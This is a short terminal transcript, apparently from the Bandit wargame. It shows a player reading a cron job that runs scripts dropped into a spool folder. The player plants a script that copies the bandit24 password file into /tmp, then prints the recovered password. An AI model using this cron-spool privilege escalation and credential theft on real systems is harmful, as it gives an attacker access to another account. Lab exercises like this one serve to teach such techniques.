cat /etc/cron.d/cronjob_bandit24
# donne
# * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@melinda:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 "./$i"
	rm -f "./$i"
    fi
done

# vim script.bash
#!/bin/bash
mkdir -p /tmp/12344321
cat /etc/bandit_pass/bandit24 > /tmp/12344321/ok 2> /tmp/12344321/erreur

chmod +x script.bash

cat /tmp/12344321/ok
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
